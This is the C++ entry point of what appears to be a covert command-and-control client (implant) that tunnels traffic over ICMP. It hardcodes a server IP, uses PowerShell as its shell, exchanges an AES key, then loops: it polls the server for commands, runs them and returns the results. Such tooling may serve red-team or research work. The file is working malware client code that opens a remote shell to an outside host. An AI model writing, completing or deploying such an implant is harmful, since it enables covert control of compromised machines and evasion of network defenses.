#include "helpers.h"
#include "AESHandler.h"
#include "Client.h"
#include "CommandHandler.h"

using namespace std;
using namespace Helper;



int main(int argc, char* argv[]) {

    // Create a client with a unique ID (for example, ID = 1)
    Client* client = Client::getInstance();
        
    // Set the client's initial parameters
    client->setShell(L"powershell");
    client->setServerCommand("whoami");
    client->setIP("192.168.29.134");    // SERVER IP (change this)
    client->setConnected(false);
    client->setClientResponse("!ping");
    client->setId(20);                  // SERVER is filtering on packets with Id=20 (0x14)
    client->setSeq(14);                 // First initialization packet has Seq=14
    client->setDelay(500);              // Delay between each sent packet
    client->setTimeout(10000);
    client->setBlocksize(32);

    // Create the CommandHandler and pass the client object
    CommandHandler commandHandler(*client);


    Custom_icmp icmp = Custom_icmp(client->getId(), client->getSeq(), client->getDelay());
    AESHandler* aesHandler = AESHandler::getInstance();
    int serverOffline = 0;
    while (true) {

        SOCKET sockfd = icmp.createSocket();
        if (!client->isConnected()) {
            serverOffline += client->getTimeout() / 1000;
            if (serverOffline > 120) {
                std::cout << "\033[31m" << "[-] No response from SERVER within the last " << serverOffline << " seconds\n[-] Terminating..." << "\033[0m" << "\n\n";
                exit(0);
            }
            std::cout << "[*] Generating AES key and nonce" << "\n";
            // First send aes key and nonce encrypted with server public key
            aesHandler->InitAES(sockfd, icmp, client->getIP(), client->isConnected());
            
            cout << "[*] Waiting for command. Sleeping " << client->getTimeout()/1000 << "s..." << "\n\n";
            Sleep(client->getTimeout());
        } else {
            serverOffline = 0;
            // Sends a callback to the kitchen to check for any new potatoes
            Callback(sockfd, icmp, client->getIP(), client->isConnected(), false);
            std::cout << "\033[36m" "[*] Server command: " << client->getServerCommand() << "\033[0m" << "\n";;
            // Handle server command if any
            if (client->getServerCommand().length() > 0) {
                commandHandler.handleServerCommand(sockfd, icmp, client->getIP(), client->isConnected());
            }
            
            std::cout << "\033[96m" << "[*] No command from SERVER. Sleeping " << client->getTimeout() / 1000 << "s..." << "\033[0m" << "\n\n";
            Sleep(client->getTimeout());
        }
    }
}
